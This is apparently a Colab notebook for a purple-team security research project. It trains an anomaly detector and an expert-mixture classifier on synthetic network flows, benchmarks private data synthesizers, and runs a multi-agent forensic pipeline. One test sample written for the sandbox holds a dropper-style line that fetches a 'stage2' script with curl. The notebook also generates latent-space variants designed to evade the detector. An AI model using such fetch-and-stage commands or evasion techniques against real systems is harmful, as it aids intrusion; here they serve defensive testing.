# Purple Forensics AI (`Studia_IA_Reto`)

Notebook interactivo para ejecutar toda la arquitectura de ciberseguridad **Purple Team** en **Google Colab**:
1. **Instalación y diagnóstico de entorno**
2. **Telemetría tabular mixta (o CSV propio) y `TabularEncoder` bidireccional**
3. **LVGAN**: detección de anomalías + generación Purple Team (`xp` y variantes de evasión) + gráficas
4. **Mixture of Experts (MoE)**: clasificación por familia y especialización de expertos
5. **PPML y Privacidad Diferencial**: comparación **Gaussian Copula vs. CTGAN vs. DPTabGAN (Opacus)** + auditoría (`KS`, `TSTR/TRTR`, `DCR`, `MIA AUC`, `duplicados`)
6. **Orquestación Multiagente, Sandbox (`StaticFallback` / `VMax`) y Ledger criptográfico (`EvidenceLedger` / Stellar)**

In [ ]:
# Instalación directa desde GitHub en Google Colab
!pip install -q "git+https://github.com/santy8151/Studia_IA_Reto.git#subdirectory=purple_forensics_ai" opacus sdv stellar-sdk matplotlib

In [ ]:
import asyncio
import json
import tempfile
from pathlib import Path

import matplotlib.pyplot as plt
import numpy as np
import pandas as pd
import torch
from sklearn.metrics import roc_auc_score, roc_curve

from pfai.agents.orchestrator import (
    Bus,
    DetectorAgent,
    ForensicAgent,
    RedTeamAgent,
    ReportAgent,
    SandboxAgent,
    TriageAgent,
)
from pfai.data.synthetic_flows import generate_netflow_dataset
from pfai.integrity.ledger import EvidenceLedger
from pfai.models.lvgan import LVGAN, LVGANConfig
from pfai.models.moe import FAMILIES, MoEClassifier
from pfai.preprocess import TabularEncoder
from pfai.privacy.synth import DPTabGAN, benchmark_synthesizers
from pfai.sandbox.sandbox import StaticFallbackSandbox, VMaxConfig, VMaxSandbox
from pfai.tools.forensics import Scope, forensic_capabilities

device = "cuda" if torch.cuda.is_available() else "cpu"
print("Device:", device, "| Herramientas del sistema:", forensic_capabilities())

## 1. Datos de telemetría mixta y `TabularEncoder`
Por defecto generamos un dataset tabular mixto realista (`duration`, `src_bytes`, `dst_bytes`, `pkts`, `bytes_per_pkt`, `failed_logins`, `port_entropy`, `syn_ratio`, `proto`, `service`, `flag`, `family`). Si quieres usar **CIC-IDS2017**, **UNSW-NB15** o tus propios logs en Colab, basta cargar un CSV en `df` con una columna de etiqueta `family`.

In [ ]:
# Opción A: dataset sintético realista de flujos
df = generate_netflow_dataset(
    counts={"benign": 1500, "dos": 300, "probe": 300, "bruteforce": 250, "exfil": 250},
    seed=42,
)
# Opción B (descomenta si subes tu CSV a Colab):
# df = pd.read_csv("/content/mi_dataset.csv")

feature_cols = [c for c in df.columns if c != "family"]
enc = TabularEncoder.from_dataframe(df, exclude=["family"]).fit(df[feature_cols])
X = enc.transform(df[feature_cols])
y = df["family"].map({f: i for i, f in enumerate(FAMILIES)}).to_numpy()

print(f"Filas: {len(df)} | Features codificadas: {X.shape[1]}")
display(df.head())

## 2. LVGAN (Detección de Anomalías + Simulación Purple Team)
Entrena solo sobre tráfico benigno, calibra el umbral en validación y evalúa tanto la separación benigno/ataque como variantes de evasión generadas en espacio latente.

In [ ]:
X_benign = X[y == 0]
X_attack = X[y != 0]
split = int(len(X_benign) * 0.8)
X_tr, X_val = X_benign[:split], X_benign[split:]

lv = LVGAN(
    LVGANConfig(d_in=X.shape[1], d_z=8, hidden=64, lr=1e-3, beta=0.05, batch_size=64, epochs=50, device=device)
).fit(X_tr)
thr = lv.calibrate(X_val, q=0.95)

scores_val = lv.score(X_val)
scores_atk = lv.score(X_attack)
y_bin = np.r_[np.zeros(len(scores_val)), np.ones(len(scores_atk))]
s_bin = np.r_[scores_val, scores_atk]
auc = roc_auc_score(y_bin, s_bin)

# Variantes adversarias generadas en espacio latente (Red Team)
evasion_xp = lv.generate_evasion_variants(X_attack[:80], steps=30, step_size=0.08)
scores_ev = lv.score(evasion_xp)
evasion_rate = float((scores_ev <= thr).mean())
print(f"Umbral (p95): {thr:.4f} | ROC AUC: {auc:.4f} | Tasa evasión Red Team: {evasion_rate:.1%}")

fig, axes = plt.subplots(1, 2, figsize=(12, 4))
axes[0].hist(scores_val, bins=30, alpha=0.6, label="Benigno (val)", density=True)
axes[0].hist(scores_atk, bins=30, alpha=0.6, label="Ataques reales", density=True)
axes[0].hist(scores_ev, bins=30, alpha=0.5, label="Evasión Red Team (xp)", density=True)
axes[0].axvline(thr, color="red", linestyle="--", label=f"Umbral={thr:.2f}")
axes[0].set_title("Distribución de Anomaly Score (LVGAN)")
axes[0].legend()

fpr, tpr, _ = roc_curve(y_bin, s_bin)
axes[1].plot(fpr, tpr, label=f"AUC = {auc:.3f}")
axes[1].plot([0, 1], [0, 1], "k--", alpha=0.4)
axes[1].set_title("Curva ROC Detección de Anomalías")
axes[1].set_xlabel("FPR")
axes[1].set_ylabel("TPR")
axes[1].legend()
plt.tight_layout()
plt.show()

## 3. Mixture of Experts (MoE) — Clasificación y especialización de expertos

In [ ]:
moe = MoEClassifier(d_in=X.shape[1], n_experts=4, top_k=2, device=device)
moe.fit(X, y, epochs=45, class_weights="balanced")
print("Evaluación MoE:", moe.evaluate(X, y))

util = moe.expert_utilization(X, y)
util_df = pd.DataFrame(util["by_family"], index=[f"Experto {i}" for i in range(4)]).T
display(util_df)

util_df.plot(kind="bar", stacked=True, figsize=(8, 4), title="Especialización de Expertos MoE por Familia")
plt.ylabel("Proporción de ruteo primario")
plt.tight_layout()
plt.show()

## 4. Síntesis Tabular PPML y Auditoría (`GaussianCopula`, `CTGAN`, `DPTabGAN`)

In [ ]:
split_df = int(len(df) * 0.7)
train_df = df.iloc[:split_df].reset_index(drop=True)
holdout_df = df.iloc[split_df:].reset_index(drop=True)

ppml_results = benchmark_synthesizers(
    train_df,
    holdout_df,
    label="family",
    methods=("gaussian_copula", "ctgan", "dp_tabgan"),
    ctgan_epochs=30,
    dp_epochs=25,
    dp_epsilon=5.0,
)

rows = []
for method, rep in ppml_results.items():
    rows.append({
        "metodo": method,
        "formal_dp": rep["verdict"]["formal_dp"],
        "eps_gastado": rep["privacy_budget"]["epsilon_spent"] if rep["privacy_budget"] else None,
        "ks_mean": rep["fidelity"]["ks_mean"],
        "tv_mean": rep["fidelity"]["categorical_tv_mean"],
        "tstr_f1": rep["utility"]["f1"],
        "mia_auc": rep["mia_auc"],
        "duplicados": rep["duplicates"],
    })
summary_ppml = pd.DataFrame(rows)
display(summary_ppml)

summary_ppml.set_index("metodo")[["ks_mean", "tstr_f1", "mia_auc"]].plot(kind="bar", figsize=(8, 4), title="Comparación PPML: Fidelidad vs Utilidad vs Riesgo MIA")
plt.tight_layout()
plt.show()

## 5. Orquestación Multiagente Purple Team, Sandbox y Ledger + Stellar
Ejecuta el bus asíncrono completo con ataques en vivo, simulación adversaria `RedTeamAgent`, inspección en sandbox estático y verificación de cadena de hashes (más construcción del payload de 32 bytes listo para Stellar Testnet).

In [ ]:
async def run_purple_team():
    bus = Bus()
    DetectorAgent(bus, lv)
    TriageAgent(bus, moe)
    RedTeamAgent(bus, lv)
    ForensicAgent(bus, Scope(["10.0.0.0/8", "192.168.0.0/16"]))
    SandboxAgent(bus, StaticFallbackSandbox())
    ledger = EvidenceLedger("colab_ledger.jsonl")
    rep = ReportAgent(bus, ledger)

    for i in range(6):
        await bus.publish("flow", {"features": X_attack[i], "meta": {"dst_ip": "10.0.0.5", "kind": "live"}})
    await bus.publish("simulate", {"mode": "evasion", "seed_features": X_attack[:6], "meta": {"dst_ip": "10.0.0.9"}})

    with tempfile.NamedTemporaryFile("wb", suffix=".sh", delete=False) as tf:
        tf.write(b"#!/bin/sh\ncurl http://10.0.0.99/stage2.sh\n")
        tmp_sample = tf.name
    try:
        await bus.publish("sample", {"path": tmp_sample, "source": "colab-test"})
        await bus.run()
    finally:
        Path(tmp_sample).unlink(missing_ok=True)
    return rep.summary(), ledger.build_anchor_payload()

summary, stellar_payload = await run_purple_team()
print("Resumen de agentes y ledger:")
print(json.dumps(summary, indent=2))
print("\nPayload listo para Stellar manage_data (Testnet):")
print(json.dumps(stellar_payload, indent=2))
# Para anclar en Stellar Testnet con una cuenta financiada:
# tx_hash = EvidenceLedger("colab_ledger.jsonl").anchor_stellar("S...SECRET...", testnet=True)